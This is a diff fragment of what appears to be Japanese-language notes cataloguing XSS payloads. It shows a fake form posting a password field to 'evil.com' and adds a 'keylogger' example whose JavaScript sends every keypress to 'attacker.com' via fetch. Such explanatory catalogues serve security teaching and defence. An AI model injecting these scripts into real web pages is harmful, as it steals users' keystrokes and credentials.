@@ -14,4 +14,10 @@ document.querySelector('[name=csrf]')
 ```js
 document.body.innerHTML = '<form action="http://evil.com"><input name="pass"></form>';
 ```
-- 
+- keylogger
+	- 入力されたキーを1つずつ攻撃者へ送信する。
+```js
+document.onkeypress = function(e) {
+  fetch("http://attacker.com/log?key=" + e.key);
+};
+```
